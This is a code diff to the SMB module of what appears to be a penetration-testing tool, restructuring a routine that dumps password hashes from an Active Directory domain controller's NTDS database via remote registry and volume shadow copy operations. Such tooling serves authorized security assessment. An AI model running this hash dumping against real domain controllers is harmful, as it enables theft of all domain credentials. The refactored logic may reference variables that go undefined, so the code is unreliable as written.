@@ -1024,23 +1024,11 @@ class smb(connection):
         add_ntds_hash.ntds_hashes = 0
         add_ntds_hash.added_to_db = 0
 
-        if self.remote_ops and self.bootkey:
+        if self.remote_ops:
             try:
                 if self.args.ntds == 'vss':
                     NTDSFileName = self.remote_ops.saveNTDS()
                     use_vss_method = True
-
-                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
-                                 remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
-                                 pwdLastSet=False, resumeSession=None, outputFileName=self.output_filename,
-                                 justUser=None, printUserStatus=False,
-                                 perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))
-
-                self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
-                NTDS.dump()
-
-                self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds',
-                                                                                                                highlight(add_ntds_hash.added_to_db)))
 
             except Exception as e:
                 #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
@@ -1051,9 +1039,29 @@ class smb(connection):
                 #        os.unlink(resumeFile)
                 self.logger.error(e)
 
-            try:
-                self.remote_ops.finish()
-            except Exception as e:
-                logging.debug("Error calling remote_ops.finish(): {}".format(e))
+        NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
+                        remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
+                        pwdLastSet=False, resumeSession=None, outputFileName=self.output_filename,
+                        justUser=None, printUserStatus=False,
+                        perSecretCallback = lambda secretType, secret : add_ntds_hash(secret, host_id))
 
-            NTDS.finish()
+        try:
+            self.logger.success('Dumping the NTDS, this could take a while so go grab a redbull...')
+            NTDS.dump()
+            self.logger.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), self.output_filename + '.ntds',                                                                                                            highlight(add_ntds_hash.added_to_db)))
+        except Exception as e:
+            #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                # We don't store the resume file if this error happened, since this error is related to lack
+                # of enough privileges to access DRSUAPI.
+            #    resumeFile = NTDS.getResumeSessionFile()
+            #    if resumeFile is not None:
+            #        os.unlink(resumeFile)
+            self.logger.error(e)
+
+
+        try:
+            self.remote_ops.finish()
+        except Exception as e:
+            logging.debug("Error calling remote_ops.finish(): {}".format(e))
+
+        NTDS.finish()
